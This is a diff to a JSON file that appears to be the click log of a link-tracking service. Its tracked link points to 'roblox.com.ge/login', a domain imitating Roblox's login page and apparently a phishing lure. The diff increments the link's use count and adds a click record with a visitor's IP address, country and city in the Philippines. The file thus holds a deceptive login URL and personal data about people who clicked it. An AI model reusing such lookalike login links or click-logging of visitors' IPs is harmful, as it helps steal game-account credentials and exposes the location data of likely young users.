@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1126,
+    "useCount": 1127,
     "createdBy": "admin",
     "clicks": [
       {
@@ -9150,6 +9150,14 @@
         "ip": "49.144.96.233",
         "country": "Philippines",
         "city": "Dasmariñas",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777274956842,
+        "ip": "112.202.116.215",
+        "country": "Philippines",
+        "city": "Biñan",
         "flag": "🇵🇭",
         "countryCode": "PH"
       }
